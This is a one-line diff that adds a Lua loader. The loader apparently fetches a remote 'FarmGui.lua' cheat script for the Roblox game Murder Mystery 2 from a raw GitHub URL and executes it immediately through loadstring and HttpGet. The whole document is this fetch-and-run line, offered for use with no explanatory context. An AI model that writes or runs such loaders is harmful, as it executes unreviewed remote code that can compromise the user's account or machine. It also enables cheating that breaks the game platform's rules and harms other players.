@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Unknownproootest/Unknown-MurderMystery2/main/FarmGui.lua'))()
